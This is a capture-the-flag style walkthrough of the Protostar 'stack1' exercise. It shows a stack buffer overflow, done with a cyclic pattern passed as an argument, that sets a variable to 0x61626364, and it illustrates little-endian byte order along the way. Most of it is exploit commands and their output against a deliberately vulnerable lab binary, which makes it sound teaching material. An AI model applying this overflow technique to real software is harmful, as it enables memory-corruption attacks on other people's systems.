Stack1 is a simple extension of stack0, taking an argument instead of using gets().
The exception is that, instead of writing any value to the stack, we will
instead write hex 0x61626364 (ascii abcd) to the stack.

Given the same buffer size, we can continue with the pattern from the previous
exercise: *﻿Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A*

The exercise also gives us the hint that *Protostar* is a [little-endian](http://en.wikipedia.org/wiki/Endianness) system.
This fact is important as the correct order in which values need to be
inserted into memory depends of the endianess of the system.

We can see this difference as we step through overflow, adding one extra
byte at a time

```
﻿user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
Try again, you got 0x00000000
user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Aa
Try again, you got 0x00000061
user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Aab
Try again, you got 0x00006261
user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Aabc
Try again, you got 0x00636261
user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Aabcd
Try again, you got 0x64636261
```

As can be seen the values, when visualized, appear backwards as is expected
with a little-endian system.  To compensate for this, we'll simply insert
the values in reverse order:

```
﻿user@protostar:/opt/protostar/bin$ ./stack1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Adcba
you have correctly got the variable to the right value
```

Success!  Move on to [Stack2](../stack2/)
